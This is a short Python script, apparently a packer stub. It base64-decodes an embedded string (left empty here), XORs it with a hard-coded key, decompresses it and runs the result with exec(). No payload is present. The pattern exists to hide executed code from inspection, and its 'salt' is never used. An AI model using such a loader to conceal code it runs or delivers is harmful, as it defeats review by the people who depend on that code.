#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import zlib, base64

KEY = b'01234567890123456789012345678901'
encrypted_b64 = ""

def xor_crypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def decrypt_data(encrypted):
    salt = encrypted[:16]
    cipher = encrypted[16:]
    plain = xor_crypt(cipher, KEY)
    decompressed = zlib.decompress(plain)
    return decompressed

if __name__ == "__main__":
    enc_data = base64.b64decode(encrypted_b64.encode())
    code = decrypt_data(enc_data)
    exec(code)
